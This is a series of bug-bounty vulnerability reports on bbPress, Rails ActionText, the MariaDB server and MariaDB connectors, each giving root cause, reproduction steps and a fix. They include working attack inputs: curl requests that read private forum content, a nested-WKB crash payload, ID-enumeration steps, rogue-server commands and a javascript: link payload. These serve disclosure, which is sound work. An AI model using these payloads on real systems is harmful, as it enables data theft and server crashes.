title: Information Disclosure - Unauthen Leak Private Content
vulnerability_information:
## Affected Version + Version Used: | Component | Version | |---|---| | WordPress | 7.1.2 | | BuddyPress | 14.5.2 | | bbPress | 2.6.18 (the exact zip reviewed: `https://downloads.wordpress.org/plugin/bbpress.2.6.18.zip`) | | PHP | 8.4.24 (cli) | | MariaDB | 11.8.8-MariaDB-1 (Debian) | ## Description: bbPress's BuddyPress integration computes the hide_sitewide flag for new topic/reply activity by checking only the posting forum's own status, not its ancestors. A publish-status subforum nested under a private/hidden parent forum therefore has its topics broadcast in full (title, forum name, permalink, raw body) to BuddyPress's public Activity stream, even though the topic's own permalink correctly 404s for the same viewer. ## Steps To Reproduce: 1. Member posts topic in subforum (forum_id=6, child of private forum) curl -s -b cookies.txt -L -d "bbp_topic_title=Test&bbp_topic_content=Secret&bbp_forum_id=6&action=bbp-new-topic&_wpnonce=$N" \ https://site/forums/forum/private/public-subforum/ -> HTTP 200, redirect to /forums/topic/test/ 2. Direct permalink correctly blocked curl -s -o /dev/null -w "%{http_code}" https://site/forums/topic/test/ -> 404 3. Anonymous read via public activity stream curl -s https://site/wp-json/buddypress/v1/activity | grep -o '"rendered":"[^"]*Secret[^"]*"' -> "rendered":"

Secret

" (full content disclosed) ## Recommendations Code Fix: In includes/extend/buddypress/activity.php (inside topic_create and reply_create), remove the false argument so bbp_is_forum_public() correctly checks parent ancestors: ``` // Change from: ! bbp_is_forum_public( $forum_id, false ) 'hide_sitewide' => ! bbp_is_forum_public( $forum_id ), ``` ## Impact Data Leakage: Full post content, titles, and details of topics inside private or hidden subforums are broadcast to the public activity stream. Access Control Bypass: Unauthenticated users or low-privileged accounts can read restricted content via the BuddyPress feed/API, even though direct links return a 404.

title: ActionText `to_markdown` still allows `javascript:` links in kramdown via Rails-generated table cells after PR #58754

summaries.author: flavorjones
summaries.content:
`ActionText::Content#to_markdown` writes the text of `` and `
` elements unescaped and relies on the code span delimiter to keep it inert. For code in a table cell that starts with two or more spaces or a tab, such as `  [click](javascript:alert(1))`, it emitted a code span delimited by two backticks. That Markdown is correct, and Commonmarker and Redcarpet render it as code. kramdown rebuilds the span with a single backtick when it splits the table row into cells, then fails to open it, and renders a `javascript:` link that `to_markdown` refuses to emit from an `` element.

We closed the report as Informative because the link comes from kramdown misparsing correct Markdown. We changed `to_markdown` in [rails/rails#58956](https://github.com/rails/rails/pull/58956) to strip leading and trailing whitespace from code spans in table cells, which avoids the kramdown behavior. `to_markdown` is not yet in any released version of Rails.

Thanks to @deah313 for the report.

title: Server crash (stack-overflow DoS) via unbounded recursion in MariaDB WKB GEOMETRYCOLLECTION parser

asset.asset_identifier: MariaDB Server & Connectors  - Denial of Service

vulnerability_information:
Reported via email as per policy to security@mariadb.org on July 4 but received no response., hence reporting here.

# Server crash (stack-overflow DoS) via unbounded recursion in MariaDB WKB GEOMETRYCOLLECTION parser

**Target:** MariaDB Server 13.1.0-alpha, source rev `bd366d81b80aa65fc76ec570fa0bf218a996853b` (fresh, 2026-07-01)
**Component:** spatial / GIS WKB parser — `sql/spatial.cc`
**Class:** CWE-674 Uncontrolled Recursion → stack exhaustion → SIGSEGV (Denial of Service)
**Status:** Confirmed end-to-end against a live ASan server (SIGSEGV reproduced; depth-differential proven).

---

## Summary

`Gis_geometry_collection::init_from_wkb()` and `::get_data_size()` recurse once per nested
child geometry when parsing a WKB (Well-Known Binary) `GEOMETRYCOLLECTION`, with **no
recursion-depth limit and no `check_stack_overrun()` call**. A single crafted value with a
few thousand levels of nested `GEOMETRYCOLLECTION` exhausts the thread stack and crashes the
**entire server** (all connections dropped). Reachable by any user who can call a spatial
function or write a `GEOMETRY` value — i.e. a low-privileged authenticated attacker.

Notably, MariaDB guards recursion everywhere else (`check_stack_overrun` is used in
`item.cc`, `item_func.cc`, `item_cmpfunc.cc`, `item_subselect.cc`, `item_jsonfunc.cc`,
`json_table.cc`, `json_schema.cc`, …). The geometry WKB parser is the outlier — it has **no
such guard** (`grep -rn check_stack_overrun sql/spatial.cc sql/spatial.h sql/item_geofunc.cc`
→ no matches). This is a cross-path asymmetry: the protection pattern exists project-wide but
was never applied to this parser.

---

## Root cause

`sql/spatial.cc`:

```
uint Gis_geometry_collection::init_from_wkb(const char *wkb, uint len, ...) {   // :4414
  ...
  while (n_geom--) {                                                             // :4429 (attacker n_geom)
    Geometry_buffer buffer;                                                      // :4431 stack frame per level
    Geometry *geom = create_by_typeid(&buffer, wkb_type);
    if (!(g_len = geom->init_from_wkb(wkb, len, bo, res)))                       // :4447 RECURSE
      return 0;
    ...
  }
}
uint32 Gis_geometry_collection::get_data_size() const {                          // :4284
  ...
  while (n_objects--) {
    if ((object_size = geom->get_data_size()) == GET_SIZE_ERROR) ...             // :4308 RECURSE
  }
}
```

Each nesting level consumes one C++ stack frame (holding a `Geometry_buffer`). With the
default `thread_stack` (~292 KB), a few thousand levels overflow the stack → SIGSEGV inside
the recursion. There is no `check_stack_overrun()` and no depth cap on either path.

**Reachable entry points (whole geometry front-end family — `check_stack_overrun` appears
ZERO times in `sql/spatial.cc` and `sql/item_geofunc.cc`):**
- **WKB** — `Item_func_geometry_from_wkb::val_str` → `Geometry::create_from_wkb` →
  `Gis_geometry_collection::init_from_wkb` (spatial.cc:4414, recurse :4447). `ST_GeomFromWKB`,
  `ST_GeomCollFromWKB`.
- **WKT (text)** — `Geometry::create_from_wkt` (spatial.cc:393) →
  `Gis_geometry_collection::init_from_wkt` → recurses via `create_from_wkt` (spatial.cc:4342).
  `ST_GeomFromText`, `ST_GeomCollFromText`.
- **GeoJSON** — `Gis_geometry_collection::init_from_json` recurses via child `init_from_json`
  (spatial.cc:767). `ST_GeomFromGeoJSON`.
- **Stored value** — `Field_geom::store` → `is_binary_valid()` → `get_data_size()` (recursive
  form) — `INSERT`/`UPDATE` of a crafted value into a `GEOMETRY` column.

All four share the single missing `check_stack_overrun` in the geometry-collection recursion.

---

## Evidence (live ASan server, MariaDB 13.1.0-alpha, `-DWITH_ASAN=ON`)

Malicious WKB = little-endian nested GEOMETRYCOLLECTION (type 7):
`0107000000` + `010000000107000000` × K + `00000000` (each 9-byte unit adds one nesting level).

Depth differential on one server instance (`--thread-stack=299008`):

| Test | K (nesting) | Result |
|---|---|---|
| Sanity: `ST_GeomFromWKB(<point>)` | 0 | returns normally |
| Shallow: `SELECT ST_GeomFromWKB(0x…)` | 50 | `rc=0`, **server alive** |
| Deep: `SELECT ST_GeomFromWKB(0x…)` | 120000 | client `rc=1`, **server DIED, exit/sig=139 (SIGSEGV)** |

Reproduced across two independent runs. A normal/shallow geometry parses fine; only the deep
nesting crashes — conclusively a depth-dependent recursion (stack overflow), not a malformed-
byte parse bug.

**WKT front-end (sibling entry point) — independently confirmed on the same server:**
`SELECT ST_GeomFromText('GEOMETRYCOLLECTION(' ×K ... 'POINT(1 1)' ')' ×K)`: K=50 returns
normally (server alive); **K=100000 → server DIED, exit signal 139 (SIGSEGV)**. Same
depth-dependent stack overflow via the WKT `create_from_wkt` recursion (spatial.cc:4342).
GeoJSON (`ST_GeomFromGeoJSON` → `init_from_json`, spatial.cc:767) recurses identically with no
guard (code-confirmed). Reproducer: `reports/mariadb_poc/wkt_poc.sh`. (ASan emits no textual report here because the stack is exhausted before its
handler can run — the process takes a raw SIGSEGV, which is the stack-overflow signature.)

Reproducer scripts: `reports/mariadb_poc/wkb_poc.sh`, `wkb_diff.sh` (generate the WKB and
drive the server). Minimal manual repro:

```sql
-- build 0x0107000000 + 010000000107000000*120000 + 00000000 and:
SELECT ST_GeomFromWKB(0x0107000000...00000000);   -- server crashes (SIGSEGV)
```

---

## Impact

| Aspect | Assessment |
|---|---|
| Effect | Full `mariadbd` crash (SIGSEGV) → all client connections dropped; repeatable = sustained DoS |
| Privilege | Low — any account able to run a spatial function or write a GEOMETRY column |
| Vector | `AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H` → **CVSS 3.1 ≈ 6.5 (Medium)** |
| RCE | No — stack exhaustion crash, not a controllable memory write |


## Suggested fix

Call `check_stack_overrun()` at the top of `Gis_geometry_collection::init_from_wkb` and
`::get_data_size` (as done throughout the rest of the server), or enforce a maximum
GEOMETRYCOLLECTION nesting depth, returning a clean parse error instead of recursing.

## Impact

| Aspect | Assessment |
|---|---|
| Effect | Full `mariadbd` crash (SIGSEGV) → all client connections dropped; repeatable = sustained DoS |
| Privilege | Low — any account able to run a spatial function or write a GEOMETRY column |
| Vector | `AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H` → **CVSS 3.1 ≈ 6.5 (Medium)** |
| RCE | No — stack exhaustion crash, not a controllable memory write |

title: Unauthenticated disclosure of private and hidden forum content in bbPress via the WordPress core REST single-item endpoint
vulnerability_information:
## Description:

bbPress restricts the topics and replies inside private and hidden forums to authorized members. The current development version (2.7.0) registers the forum, topic, and reply post types with `show_in_rest => true`, which exposes them through the WordPress core REST API. bbPress enforces forum visibility only through a `pre_get_posts` query filter, and the core REST single-item endpoint reads a post directly by ID without running that filter. As a result, an unauthenticated attacker can read the full content of any topic or reply located in a private or hidden forum by requesting it from the core REST API by ID. bbPress denies that same anonymous request on its front-end, on the REST collection endpoint, and on the forum's own REST endpoint, so the single-item exposure reflects an enforcement path that was never extended to REST, not a decision to publish members-only content.

Topics and replies are stored with `post_status = publish` regardless of the visibility of the forum that contains them. Topics are created with the public status in `src/includes/topics/functions.php:33` (`'post_status' => bbp_get_public_status_id()`), and replies likewise. Only the forum container carries the restricted status: a private forum has the core `private` status and a hidden forum has bbPress's custom `hidden` status (registered with `'private' => true` in `src/bbpress.php`). bbPress keeps the restricted topics and replies out of normal listings by adding their parent forums to an exclusion set inside `bbp_pre_get_posts_normalize_forum_visibility()` (`src/includes/forums/functions.php:2329`), which is hooked to `pre_get_posts`.

As of 2.7.0 the three post types are registered with `show_in_rest => true` (`src/bbpress.php:548`, `:578`, `:608`), so WordPress automatically registers the default `WP_REST_Posts_Controller` routes for them at `/wp-json/wp/v2/forum`, `/wp-json/wp/v2/topic`, and `/wp-json/wp/v2/reply`. The released 2.6.x line does not set `show_in_rest`, so the post types default to being excluded from REST and are not affected. This change was introduced by the commit that added Gutenberg block support to the post types.

The core REST single-item endpoint does not apply bbPress's visibility filter. `WP_REST_Posts_Controller::get_item()` resolves the post with `get_post( $id )`, which is a direct primary-key lookup that does not run a `WP_Query` and therefore never triggers `pre_get_posts`. The permission check, `WP_REST_Posts_Controller::check_read_permission()`, returns true for any post whose status is `publish` without consulting capabilities or the parent forum. Because topics and replies in private and hidden forums are `publish`, the check passes for an anonymous caller and the controller returns the full `content.rendered`. bbPress registers no REST permission filter (no `rest_{post_type}_item_permissions_check`, no `register_rest_field` permission callback, no `rest_{post_type}_query` adjustment) that would re-impose forum visibility on this path.

The REST collection endpoint is not affected, which isolates the gap to the single-item path. `bbp_pre_get_posts_normalize_forum_visibility()` does not bail for REST or non-main queries, so the `WP_Query` that backs `GET /wp-json/wp/v2/topic` is filtered and the restricted topics are excluded. The single-item endpoint bypasses that query entirely.

This was confirmed end to end at runtime against WordPress with bbPress 2.7.0 trunk (attached). A hidden forum and a private forum were created with bbPress's own API, each containing a topic with secret content, plus a reply in the hidden forum. As an unauthenticated client:

- `GET /wp-json/wp/v2/topic/5` (topic in the hidden forum) returned HTTP 200 with the full content `SECRET-TOPIC: acquiring Acme Corp for $4.2B, board vote Friday.`
- `GET /wp-json/wp/v2/reply/6` (reply in the hidden forum) returned HTTP 200 with `SECRET-REPLY: wire the deposit to account 12345 before close.`
- `GET /wp-json/wp/v2/topic/9` (topic in the private forum) returned HTTP 200 with `SECRET-PRIVATE: payouts hit wallets Monday 09:00 UTC.`

The same anonymous client was denied on every other path: the REST collection `GET /wp-json/wp/v2/topic` returned an empty array (the restricted topics are excluded), the front-end permalink returned HTTP 404, and the hidden forum's own REST endpoint `GET /wp-json/wp/v2/forum/4` returned HTTP 401 `rest_forbidden`. The denials on those three paths establish that the data is members-only and that only the single-item REST route fails to honor it.

Topic and reply IDs are sequential integers, so the restricted corpus is harvested by iterating IDs. Iterating `topic/1` through `topic/10` as an unauthenticated client returned content only for the two restricted topics and 404 for the rest, demonstrating an unauthenticated, scalable read of members-only forum content with no knowledge of IDs required beyond enumeration.

The affected version is the 2.7.0 development line (trunk), where the forum post types are newly exposed to REST. The released 2.6.x line does not set `show_in_rest` and is not affected, so reporting it now prevents the regression from reaching the installed base when 2.7.0 ships.

## Steps To Reproduce:

1. Install WordPress with bbPress 2.7.0 (trunk) active and pretty permalinks enabled.
1. Create a hidden forum (or a private forum) and post a topic and a reply in it. The topic and reply are stored with `post_status = publish`; only the forum carries the hidden or private status.
1. As an unauthenticated client (no cookie, no auth header), request `GET /wp-json/wp/v2/topic/<topic_id>` and `GET /wp-json/wp/v2/reply/<reply_id>`. The response is HTTP 200 and the JSON `content.rendered` field contains the full topic or reply content.
1. Confirm the data is otherwise restricted for the same anonymous client: `GET /wp-json/wp/v2/topic` returns an array that excludes the topic, the topic's front-end permalink returns HTTP 404, and `GET /wp-json/wp/v2/forum/<forum_id>` returns HTTP 401.
1. Iterate `<topic_id>` and `<reply_id>` over the sequential ID space to harvest the private and hidden forum corpus.

## Recommendations

Re-impose forum visibility on the REST path, or do not expose the content to REST at all. Any one of the following resolves it:

- Register a `permission_callback` / `rest_{post_type}_item_permissions_check` filter for the forum, topic, and reply post types that calls `bbp_current_user_can_see()` (or the equivalent ancestor-forum visibility check) on the requested object and denies the read when the current user cannot see the containing forum. This mirrors the visibility logic already enforced on the front-end and on `WP_Query`.
- Alternatively, scope `show_in_rest` to capability (for example, expose the content in REST only for users who can moderate or edit the relevant post type), so the Gutenberg editing use case is served without exposing unauthenticated reads.
- Alternatively, register a custom `rest_controller_class` that filters both collection and single reads through the existing forum-visibility logic.

The fix should cover both the single-item and collection endpoints for all three post types, and should be verified against the controls above (front-end 404, collection exclusion, forum 401) so the REST single-item path matches the visibility enforced everywhere else.

## Supporting Material/References:

- `bbpress_rest_disclosure_poc.txt`: captured transcript of the unauthenticated single-item REST requests returning the hidden- and private-forum topic and reply content, the control checks (collection exclusion, front-end 404, forum 401), and the ID-enumeration harvest.
- `reproduce.sh` and `docker-compose.yml`: stand up WordPress + bbPress 2.7.0 trunk, create the hidden and private forums with secret topics/replies, and run the requests and the controls.
- Source references (bbPress trunk): `src/bbpress.php:548,578,608` (`show_in_rest => true` on forum/topic/reply); `src/includes/forums/functions.php:2329` (`bbp_pre_get_posts_normalize_forum_visibility`, hooked to `pre_get_posts`); `src/includes/topics/functions.php:33` (topics created with `bbp_get_public_status_id()` = publish). bbPress registers no REST permission filter for these post types. WordPress core: `WP_REST_Posts_Controller::check_read_permission()` returns true for `publish` status, and `get_item()` resolves the post via `get_post()` without a `WP_Query`.

## AI disclosure:

This report was produced with AI assistance. An automated source-analysis pass identified the candidate by reviewing the bbPress code for read paths that bypass the plugin's forum-visibility enforcement. The finding was then verified end to end against a live WordPress + bbPress 2.7.0 trunk instance, and the code citations, the runtime proof of concept, and this writeup were assembled and checked with AI tooling under human review. Every code reference and the attached transcript were confirmed against the running build.

## Impact

An unauthenticated attacker can read the full content of topics and replies posted in private and hidden bbPress forums. That content is restricted to forum members, and bbPress denies it to anonymous users on the front-end, on the REST collection endpoint, and on the forum's own REST endpoint. The disclosed unit is the complete topic and reply content, not a truncated excerpt. Because topic and reply IDs are sequential integers, the attacker harvests the entire restricted forum corpus by ID iteration, with no authentication, account, or user interaction required.

The issue is present in the 2.7.0 development line, which newly exposes these post types to REST, and not in the released 2.6.x line. Reporting it before release prevents the regression from shipping to the bbPress installed base.

title: r2dbc-mariadb Parsec auth: server-controlled PBKDF2 iteration count causes CPU-exhaustion DoS ( regression from b7766de )

asset.asset_identifier: MariaDB Server & Connectors  - Denial of Service

vulnerability_information:
In mariadb-connector-r2dbc 1.4.1 (HEAD a82d265, all released versions), the Parsec authentication plugin derives its key with PBKDF2 using an iteration count of `1024 << iterations`, where `iterations` is a single byte read directly from the server's ext-salt response and bounded only by the check `iterations > 20`. A malicious or man-in-the-middle MariaDB server that selects the `parsec` plugin can set `iterations = 20`, forcing `1024 << 20 = 1,073,741,824` (~1.07e9) rounds of PBKDF2-HMAC-SHA512 during the handshake, pinning a client CPU core for ~25 minutes per connection attempt before authentication completes. This is a regression introduced by commit b7766de, which loosened the cap from `> 3` (old maximum `1024 << 3 = 8192` rounds) to `> 20`.

### Root cause

`ParsecPasswordPlugin.java`:

```java
 64   if (buf.readableBytes() > 2) {
 65     firstByte = buf.readByte();
 66     iterations = buf.readByte();          // fully server-controlled
 67   }
 68
 69   if (firstByte != 0x50 || iterations > 20) {   // only upper bound
 70     throw new R2dbcNonTransientResourceException(...);
 71   }
 ...
104   PBEKeySpec spec = new PBEKeySpec(password, salt, 1024 << iterations, 256);
105   SecretKey key = SecretKeyFactory.getInstance("PBKDF2WithHmacSHA512").generateSecret(spec);
```

`iterations` is taken from the server's ext-salt reply (authMoreData) and is fully attacker-controlled. The `parsec` plugin is registered in `META-INF/services`, and the server chooses the authentication plugin during the handshake. `restrictedAuth` defaults to null (no client-side allow-list), so the driver runs `parsec` whenever the server asks. The exchange happens before authentication is established. The driver also defaults to `sslMode=DISABLE` (plaintext), exposing it to an active MITM.

### Steps To Reproduce

Environment: JDK 21, the project's own build (`mvn -o -DskipTests package` producing `r2dbc-mariadb-1.4.1.jar`).

**Proof 1 - End-to-end rogue server** (`RogueParsecServer.java` attached):

A rogue MariaDB server speaks the wire protocol through the parsec ext-salt exchange, then sends a malicious `iterations` byte. It measures server-side how long the real `MariadbConnectionFactory.create()` is stuck computing PBKDF2. The same server differs only in that one byte:

1. Compile and run the rogue server:
```bash
javac -cp r2dbc-mariadb-1.4.1.jar:reactor-core.jar:r2dbc-spi.jar RogueParsecServer.java
java -Djava.security.egd=file:/dev/urandom -cp .:r2dbc-mariadb-1.4.1.jar:reactor-core.jar:r2dbc-spi.jar:reactive-streams.jar:netty-*.jar RogueParsecServer
```

2. Observe the output:

```
[neg control] ext-salt iterations=3 (1024<<3 = 8192 rounds):
    server saw client stuck 160 ms ; client create() returned in 1148 ms

[attack] ext-salt iterations=15 (1024<<15 = 33554432 rounds):
    server saw client stuck 47286 ms ; client create() returned in 47604 ms
    at the maximum allowed iterations=20 this is 1024<<20 = 1073741824 rounds -> ~25 min.
    (real driver logs "Authentication success" -- the full handshake completes after the delay)
```

A single attacker-chosen byte pinned the real driver's connect for ~47 seconds versus ~160 ms for the `iterations=3` control (296x).

**Proof 2 - Direct scaling measurement** (`ParsecPoc.java` attached):

Measures the exact lines 104-105 computation across iteration exponents, confirming the 2x-per-increment law:

```bash
iterations   rounds           wall_ms
3            8192             231            <- negative control (old cap > 3)
10           1048576          1518
13           8388608          11745
15           33554432         45113
extrapolation to iterations=20 (rounds=1073741824): ~1503360 ms (~25.1 min)
```

Real `ParsecPasswordPlugin.next()` at iterations=13: 11753 ms (81x the iterations=3 control of 145 ms).

### Supporting Material/References

- Vulnerable file: `src/main/java/org/mariadb/r2dbc/authentication/standard/ParsecPasswordPlugin.java:104`
- Regression commit: b7766de (loosened cap from `> 3` to `> 20`)
- Accepted sibling: H1 #3835450 (mariadb-connector-nodejs DoS, Medium)
- Attachments: `RogueParsecServer.java`, `ParsecPoc.java`, `poc_evidence.txt`

## Impact

A malicious or MITM MariaDB server pins a client CPU core for minutes per connection attempt, unauthenticated and repeatable. Behind a connection pool that retries failed connections, this becomes sustained whole-application CPU exhaustion and denial of service. The asymmetric amplification is extreme: a single attacker-chosen byte forces ~1.07 billion PBKDF2-HMAC-SHA512 rounds (~25 minutes of CPU). No valid credentials are needed, and the default `sslMode=DISABLE` exposes the handshake to network-level MITM. The fix is to restore a small hard cap on the iteration exponent (e.g. `iterations > 3`), matching the pre-b7766de behavior.

title: Connector/C++: heap out-of-bounds read when malicious server field length exceeds declared column length in binary result path

asset.asset_identifier: MariaDB Server & Connectors  - Denial of Service

vulnerability_information:
MariaDB Connector/C++ sizes each result-column bind buffer to the column length the server declared at PREPARE time, but then reads `bind.length_value` - the actual field length the server reports in each row packet - bytes out of that buffer. libmariadb sets `length_value` to the full server-sent field length even when it only copied `MIN(len, buffer_length)` bytes into the smaller buffer. The C++ layer never clamps `MIN(length_value, buffer_length)`. A malicious or MITM server that declares a small column but sends a larger field value drives a heap out-of-bounds read, leaking adjacent process memory into application-visible column values and crashing the client.

Confirmed end-to-end with ASAN (heap-buffer-overflow READ) and a non-ASAN release build (heap leak + crash) at HEAD c57f17f (VERSION 1.0.8 dev).

### Root cause

Buffer allocation, frozen at PREPARE time (`src/protocol/capi/BinRowProtocolCapi.cpp:55-73`):

```cpp
length      = columnInfo->getLength();     // server-declared column length
bind.back().buffer_length =
    columnInfo->getColumnType().binarySize() != 0 ?
    columnInfo->getColumnType().binarySize() :
    getLengthMaxFieldSize();               // == declared column length for string/blob types
bind.back().buffer = new uint8_t[bind.back().buffer_length];  // line 69: small allocation
bind.back().length = &bind.back().length_value;
```

libmariadb reports untruncated field length (`libmariadb/ma_stmt_codec.c:599`):

```c
// convert_froma_string: copies MIN(len, buffer_length) bytes but reports full length
*r_param->length = (ulong)len;   // full server field length, uncapped
```

The C++ layer trusts `length_value` as the readable extent:

```cpp
// setPosition BinRowProtocolCapi.cpp:107-108
length   = bind[index].length_value;                      // server field length, uncapped
fieldBuf.wrap(static_cast<char*>(bind[index].buffer), length);  // wraps small buffer with large length

// cacheCurrentRow BinRowProtocolCapi.cpp:1716
rowDataCache.emplace_back(static_cast<const char*>(b.buffer),
                          b.length_value);  // copies length_value bytes from buffer_length-sized allocation
```

When `length_value > buffer_length`, the difference is read out of bounds from the heap.

The vulnerable binary path is reached with `useServerPrepStmts=true` or ANY `prepareCall(...)` stored procedure call (which always creates a `ServerSidePreparedStatement` regardless of the option - `MariaDbProcedureStatement.cpp:59,83`).

### Steps To Reproduce

Environment: Linux x86-64, connector built from HEAD c57f17f with AddressSanitizer.

**Step 1** - Start the rogue server (`rogue_server.py` attached):

```bash
python3 rogue_server.py --port 13399 --col-length 4 --field-len 40000 --once &
```

The server speaks enough protocol for the binary prepared-statement flow: handshake, session SELECTs, COM_STMT_PREPARE (one STRING column, declared length 4), COM_STMT_EXECUTE (binary row with field length 40000).

**Step 2** - POSITIVE (attack) - real ASAN-built connector (`poc_client.cpp` attached):

```bash
./poc_client 127.0.0.1 13399
```

Output:

```bash
==ERROR: AddressSanitizer: heap-buffer-overflow ... READ of size 40000
    #1 sql::CArray<char>::CArray(const char*, unsigned long) CArrayImp.h:68
    #5 BinRowProtocolCapi::cacheCurrentRow(...) BinRowProtocolCapi.cpp:1716
    #6 SelectResultSetCapi::cacheCompleteLocally() SelectResultSetCapi.cpp:2039
   #11 BasePrepareStatement::executeQuery() BasePrepareStatement.cpp:1441
0x...494 is located 0 bytes after 4-byte region [0x...490,0x...494)
allocated by thread T0 here:
    #1 BinRowProtocolCapi::BinRowProtocolCapi(...) BinRowProtocolCapi.cpp:69
```

The OOB read fires inside `executeQuery()` in the default buffered path.

**Step 3** - NEGATIVE CONTROL (honest server: declared length = field length):

```bash
python3 rogue_server.py --port 13401 --col-length 40000 --field-len 40000 --once &
./poc_client 127.0.0.1 13401
```

Output:

```bash
[client] got string, length=40000
[client] done (no crash)          # exit 0, zero ASAN errors
```

No OOB when the server doesn't lie. The mismatch is the sole cause.

**Real-world impact on non-ASAN release build:**

Info leak (col=4, field=64):
```bash
[client] first 64 bytes (hex): 41414141 5a770000 201b3f81 5a770000 5868fb03 16610000 ...
         ^^^^^^^^ 4 bytes stored     ^^^^^^^^^^^^^ adjacent process heap (heap pointers visible)
```

DoS (col=4, field=500000000): process crash + core dump (exit 134).

### Supporting Material/References

- Vulnerable allocation: `BinRowProtocolCapi.cpp:69` (`new uint8_t[buffer_length]`)
- OOB read sink: `BinRowProtocolCapi.cpp:1716` (`cacheCurrentRow`)
- Incomplete fix context: HEAD commit CONCPP-152 hardened `length_value == 0` but not `length_value > buffer_length`
- Accepted sibling: H1 #3835450 (connector-nodejs malicious-server DoS, Medium)
- Attachments: `rogue_server.py`, `poc_client.cpp`, `run_poc.sh`, `poc_evidence.txt`

## Impact

**Information disclosure**: Adjacent process heap memory is copied into the value the connector returns to the application as an ordinary column string. In a connection-pooled server - the dominant deployment for a database connector - that adjacent heap can contain other requests'/users' data, credentials, or pointers usable for ASLR defeat. Demonstrated: app SELECTs a 4-wide column and receives 64 bytes containing 4 bytes of actual data followed by 60 bytes of leaked heap (with visible heap pointers).

**Denial of service**: An attacker-chosen `length_value` (up to 4 GB) drives the OOB `memcpy` far past the small allocation, reliably crashing the client process. Demonstrated: field length 500MB causes process abort + core dump.

**Preconditions**: The client connects to a malicious or MITM-controlled server and reads a result set via the binary protocol (`useServerPrepStmts=true` or any stored procedure call). No credentials or privileges required. A single crafted result row is sufficient.

title: Connector/ODBC: malicious server's long version string wraps size_t PrefixLen via negative _snprintf return, causing heap out-of-bounds write

asset.asset_identifier: MariaDB Server & Connectors  - Denial of Service

vulnerability_information:
MariaDB Connector/ODBC formats every diagnostic message with a prefix that embeds the server version string. The prefix is built in `MADB_PutErrorPrefix` (driver/ma_error.cpp:165) with the driver's custom `_snprintf`, which returns a NEGATIVE value when the output is truncated (driver/ma_platform_posix.cpp:41). The return value is added to `error->PrefixLen`, a `size_t` (unsigned, driver/ma_c_stuff.h:70). A malicious or MITM MariaDB server that sends a handshake `server_version` string longer than ~500 bytes causes `_snprintf` to truncate and return negative, wrapping `PrefixLen` to ~2^64. Every subsequent use of `PrefixLen` as an offset into the fixed 513-byte `SqlErrorMsg` buffer then writes out of bounds at a server-chosen backward offset.

This is an unauthenticated, remotely triggered client-side memory corruption that fires as soon as the application allocates a statement on the poisoned connection. Confirmed end-to-end with ASAN against the real driver built from HEAD 4e175d9 (v3.2.10).

### Root cause

1. Custom `_snprintf` returns negative on truncation (driver/ma_platform_posix.cpp:41):

```c
int _snprintf(char *buffer, size_t count, const char *format, ...) {
    int result = vsnprintf(buffer, count, format, list);
    if (result > count) { return count - result - 1; }   // NEGATIVE
    return result;
}
```

2. `MADB_PutErrorPrefix` adds the negative return to a `size_t` (driver/ma_error.cpp:155-170):

```c
error->PrefixLen = strlen(MARIADB_ODBC_ERR_PREFIX);   // "[ma-3.2.10]" ~ 11
strcpy_s(error->SqlErrorMsg, SQL_MAX_MESSAGE_LENGTH + 1, MARIADB_ODBC_ERR_PREFIX);
if (dbc != NULL && dbc->mariadb != NULL) {
  error->PrefixLen += _snprintf(error->SqlErrorMsg + error->PrefixLen,
    SQL_MAX_MESSAGE_LENGTH + 1 - error->PrefixLen,
    "[%s]", mysql_get_server_info(dbc->mariadb));
    // ^^ attacker-controlled, uncapped version string from handshake
}
```

With a version string of length L > ~500, the `_snprintf` return is negative, and `PrefixLen += <negative>` wraps to approximately `2^64 - (L - 510)`. The backward distance is chosen by the attacker via the version-string length.

3. Two OOB write sinks use the corrupted `PrefixLen`:

- `MADB_CLEAR_ERROR` / `MA_ClearError` (driver/ma_error.h:168, driver/ma_api_internal.cpp:58): `SqlErrorMsg[PrefixLen] = 0;` - one-byte OOB write
- `MADB_SetNativeError` (driver/ma_error.cpp:231,235): `strcpy_s(SqlErrorMsg + PrefixLen, 513 - PrefixLen, msg)` - multi-byte OOB write with server-controlled error text

### Steps To Reproduce

Environment: Linux x86-64, unixODBC 2.3.14, driver built from HEAD 4e175d9 with AddressSanitizer (`cmake -DWITH_ASAN=ON`).

**Step 0 - Confirm libmariadb exposes the long version** (`direct_version_check.c` attached):

```bash
$ ./direct_version_check 3402   # rogue server version_len=2000
server_info_len=2000  first16=AAAAAAAAAAAAAAAA
```

`mysql_get_server_info()` returns the full 2000-byte handshake version uncapped.

**Step 1 - Start the rogue server** (`rogue_server.py` attached):

```bash
python3 rogue_server.py 3404 4000 &   # port 3404, version string = 4000 bytes
```

The rogue server speaks enough MariaDB wire protocol for the connection to succeed and advertises a 4000-byte `server_version` in the handshake.

**Step 2 - POSITIVE (attack)** - real ASAN-built driver + real unixODBC (`odbc_client.c` attached):

```bash
./odbc_client "DRIVER=.../build_asan/driver/libmaodbc.so;SERVER=127.0.0.1;PORT=3404;UID=u;PWD=p;SSLVERIFY=0;"
```

Output:

```bash
SQLDriverConnect r=0                        <- connection SUCCEEDS
allocating statement (MADB_StmtInit -> PutErrorPrefix)
==ERROR: AddressSanitizer: heap-buffer-overflow ... WRITE of size 1
    #0 MA_ClearError(short, void*)  driver/ma_api_internal.cpp:58
    #1 SQLGetStmtAttr               driver/odbc_3_api.cpp:997
    #2 libodbc.so.2                 (unixODBC Driver Manager)
    #3 main                         odbc_client.c:32
```

The OOB write fires at statement allocation. No application query needed.

**Step 3 - NEGATIVE CONTROL** - identical path, normal version string (20 bytes):

```bash
python3 rogue_server.py 3405 20 &
./odbc_client "DRIVER=...;SERVER=127.0.0.1;PORT=3405;UID=u;PWD=p;SSLVERIFY=0;"
```

Output:

```bash
SQLDriverConnect r=0
SQLAllocHandle(STMT) r=0
SQLExecDirect r=0 (survived)
clean exit    EXIT=0
```

Normal-length version string causes no corruption. The long version is the sole difference.

**Automated reproduction**: `bash run_poc.sh` (attached) builds the driver with ASAN, starts the rogue server, runs both positive and negative cases.

### Supporting Material/References

- Vulnerable function: `MADB_PutErrorPrefix` at driver/ma_error.cpp:165
- Negative-return source: `_snprintf` at driver/ma_platform_posix.cpp:41
- `PrefixLen` type: `size_t` at driver/ma_c_stuff.h:70
- OOB sink 1: `MA_ClearError` at driver/ma_api_internal.cpp:58
- OOB sink 2: `MADB_SetNativeError` at driver/ma_error.cpp:231
- Trigger path: `MADB_StmtInit` at driver/ma_statement.cpp:4113
